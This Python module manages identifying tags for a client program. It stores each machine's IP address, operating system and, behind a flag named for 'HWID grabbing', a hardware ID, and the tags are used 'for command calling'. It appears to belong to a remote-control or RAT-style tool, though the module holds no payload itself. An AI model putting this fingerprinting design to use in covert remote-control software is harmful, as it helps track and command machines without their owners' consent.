import typing
import json
import os
from .config import FEATURE_STARTUP_HWID_GRABBING_ENABLED, DEFAULT_INVALID_TAGS, get_config, get_folder
from .utils import get_ip, get_operating_system, get_hwid
from .debug import message as debug_message
from . import fs

# Tags.

def get_default_tags() -> typing.List:
    """ Returns default tags. """

    default_tags = [get_ip()["ip"], get_operating_system(), "PC"]

    if FEATURE_STARTUP_HWID_GRABBING_ENABLED:
        default_tags.append(get_hwid())

    return default_tags


def reset_tags() -> None:
    """ Resets tags. """

    global _tags
    _tags = get_default_tags()
    save_tags()


def load_tags() -> None:
    """ Loads all tags data. """

    global _tags

    try:
        path = get_folder() + get_config()["paths"]["tags"]
        fs.build_path(path)

        if os.path.exists(path):
            try:
                with open(path, "r", encoding="UTF-8") as tags_file:
                    _tags = json.loads(tags_file.read())["tags"]
            except Exception as exception:  # noqa, pylint: disable=broad-except, redefined-outer-name
                debug_message(f"[Tags] Failed to load tags file, resetting tags! Exception: {exception}")
                reset_tags()
        else:
            debug_message("[Tags] Not found tags file, resetting to default!")
            reset_tags()
    except Exception as exception:  # noqa, pylint: disable=broad-except, redefined-outer-name
        debug_message(f"[Tags] Failed to load tags, set tags to error! Exception - {exception}")
        _tags = DEFAULT_INVALID_TAGS


def parse_tags(tags: str) -> typing.List:
    """ Parse tags for command calling. """
    return tags.replace("[", "").replace("]", "").split(",")


def save_tags() -> None:
    """ Saves tags to the file. """

    try:
        debug_message("[Tags] Saving tags to the file...")

        path = get_folder() + get_config()["paths"]["tags"]
        fs.build_path(path)

        with open(path, "w", encoding="UTF-8") as tags_file:
            tags_file.write(json.dumps({
                "tags": _tags
            }))
    except Exception as exception:  # noqa, pylint: disable=broad-except, redefined-outer-name
        debug_message(f"[Tags] Failed to save tags! Exception - {exception}")


def get_tags() -> typing.List:
    if _tags is None:
        load_tags()
    return _tags


def set_tags(tags: typing.List):
    global _tags
    _tags = tags

_tags = None